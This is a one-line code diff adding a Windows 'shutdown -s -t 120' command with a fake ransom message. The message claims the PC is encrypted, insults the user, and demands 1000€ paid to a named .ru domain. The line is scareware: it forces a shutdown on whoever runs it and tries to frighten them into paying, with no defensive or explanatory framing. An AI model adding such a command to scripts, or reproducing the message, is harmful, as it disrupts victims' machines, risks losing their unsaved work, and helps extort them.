@@ -1,0 +1,1 @@
+shutdown -s -t 120 -c "Your PC is encrypted. SUCK!!!! Pay 1000€ to getfreeRam.ru and you will maybe get your data back and furthermore better RAM!!!, you've only 120 s left..."
